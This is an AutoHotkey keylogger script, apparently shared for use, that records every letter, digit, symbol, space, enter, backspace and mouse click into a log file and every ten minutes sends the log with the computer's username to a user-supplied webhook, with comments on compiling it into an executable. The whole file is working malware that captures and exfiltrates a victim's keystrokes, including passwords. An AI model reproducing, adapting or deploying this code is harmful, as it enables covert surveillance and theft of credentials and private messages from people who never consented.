path = C:\Users\%A_Username%\log.txt
n1 = %A_Now%
url = YOUR WEBHOOK URL
;Your webhook goes above. no need for quotes
;Download AHK from https://www.autohotkey.com/. When installed, you can right click the .ahk file and press Compile (GUI). It will then be converted to .exe.
;You can also change the path of the log file.

loop
{
	sleep, 600000 ;Yhange the value of the 600000 to any time (in milliseconds)
	FileRead, msgtxt, %path%
	FormatTime, timern, %A_Now%
	postdata=
	(
	{
 		"content": "Log at %timern%",
 		 "embeds": [
 		{
      		"title": "%A_Username%'s computer.",
      		"description": "%msgtxt%",
			"color": 8578817
  		}  
  	]
	}
	) ; Use https://leovoel.github.io/embed-visualizer/ to generate above webhook code

	WebRequest := ComObjCreate("WinHttp.WinHttpRequest.5.1")
	WebRequest.Open("POST", url, false)
	WebRequest.SetRequestHeader("Content-Type", "application/json")
	WebRequest.Send(postdata)  
}

~enter::
FileAppend, `n, %path%
return
~a::
FileAppend, a, %path%
return
~b::
FileAppend, b, %path%
return
~c::
FileAppend, c, %path%
return
~d::
FileAppend, d, %path%
return
~e::
FileAppend, e, %path%
return
~f::
FileAppend, f, %path%
return
~g::
FileAppend, g, %path%
return
~h::
FileAppend, h, %path%
return
~i::
FileAppend, i, %path%
return
~j::
FileAppend, j, %path%
return
~k::
FileAppend, k, %path%
return
~l::
FileAppend, l, %path%
return
~m::
FileAppend, m, %path%
return
~n::
FileAppend, n, %path%
return
~o::
FileAppend, o, %path%
return
~p::
FileAppend, p, %path%
return
~q::
FileAppend, q, %path%
return
~r::
FileAppend, r, %path%
return
~s::
FileAppend, s, %path%
return
~t::
FileAppend, t, %path%
return
~u::
FileAppend, u, %path%
return
~v::
FileAppend, v, %path%
return
~w::
FileAppend, w, %path%
return
~x::
FileAppend, x, %path%
return
~y::
FileAppend, y, %path%
return
~z::
FileAppend, z, %path%
return


~+a::
FileAppend, A, %path%
return
~+b::
FileAppend, B, %path%
return
~+c::
FileAppend, C, %path%
return
~+d::
FileAppend, D, %path%
return
~+e::
FileAppend, E, %path%
return
~+f::
FileAppend, F, %path%
return
~+g::
FileAppend, G, %path%
return
~+h::
FileAppend, H, %path%
return
~+i::
FileAppend, I, %path%
return
~+j::
FileAppend, J, %path%
return
~+k::
FileAppend, K, %path%
return
~+l::
FileAppend, L, %path%
return
~+m::
FileAppend, M, %path%
return
~+n::
FileAppend, N, %path%
return
~+o::
FileAppend, O, %path%
return
~+p::
FileAppend, P, %path%
return
~+q::
FileAppend, Q, %path%
return
~+r::
FileAppend, R, %path%
return
~+s::
FileAppend, S, %path%
return
~+t::
FileAppend, T, %path%
return
~+u::
FileAppend, U, %path%
return
~+v::
FileAppend, V, %path%
return
~+w::
FileAppend, W, %path%
return
~+x::
FileAppend, X, %path%
return
~+y::
FileAppend, Y, %path%
return
~+z::
FileAppend, Z, %path%
return

~0::
FileAppend, 0, %path%
return
~1::
FileAppend, 1, %path%
return
~2::
FileAppend, 2, %path%
return
~3::
FileAppend, 3, %path%
return
~4::
FileAppend, 4, %path%
return
~5::
FileAppend, 5, %path%
return
~6::
FileAppend, 6, %path%
return
~7::
FileAppend, 7, %path%
return
~8::
FileAppend, 8, %path%
return
~9::
FileAppend, 9, %path%
return

~+0::
FileAppend, ), %path%
return
~+1::
FileAppend, !, %path%
return
~+2::
FileAppend, @, %path%
return
~+3::
FileAppend, #, %path%
return
~+4::
FileAppend, $, %path%
return
~+5::
FileAppend, `%, %path%
return
~+6::
FileAppend, ^, %path%
return
~+7::
FileAppend, &, %path%
return
~+8::
FileAppend, *, %path%
return
~+9::
FileAppend, (, %path%
return

~space::
FileAppend, %A_Space%, %path%
return

~backspace::
FileAppend, {<-}, %path%

~lbutton::
FileAppend, `n, %path%
FileAppend, Click, %path%
FileAppend, `n, %path%